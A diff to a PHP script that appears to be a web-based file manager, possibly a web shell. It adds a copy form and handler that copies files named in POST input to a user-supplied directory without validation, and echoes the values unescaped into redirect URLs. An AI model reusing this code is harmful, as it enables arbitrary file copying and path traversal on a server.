@@ -1389,18 +1389,29 @@ switch ($_POST['mode']) {
 		<form method="post">
 			<tr>
 				<td colspan="2">
-					<input class="action" type="text" name="" value="file">
+					<input class="action" type="text" name="" value="<?=basename($value)?>" readonly>
 				</td>
 				<td>to</td>
 				<td>
-					<input class="action" type="text" name="" value="dir">
+					<input class="action" type="text" name="to" value="<?=cwd()?>">
 				</td>
 				<td>
-					<input type="submit" name="" value="copy">
+					<input type="submit" name="copy" value="copy">
 				</td>
 			</tr>
 		</form>
 		<?php
+		if (isset($_POST['copy'])) {
+			$data = $_POST['data'];
+			$to   = $_POST['to']; 
+			foreach ($data as $key => $value) {
+				if (copy($value, $to.'/'.$value)) {
+					print('<meta http-equiv="refresh" content="0;url=?path='.cwd().'&copy=success&filename='.$value.'&to='.$to.'">');
+				} else {
+					print('<meta http-equiv="refresh" content="0;url=?path='.cwd().'&copy=failed&filename='.$value.'&to='.$to.'">');
+				}
+			}
+		}
 		break;
 }
 if ($_GET['unzip'] == 'success') {
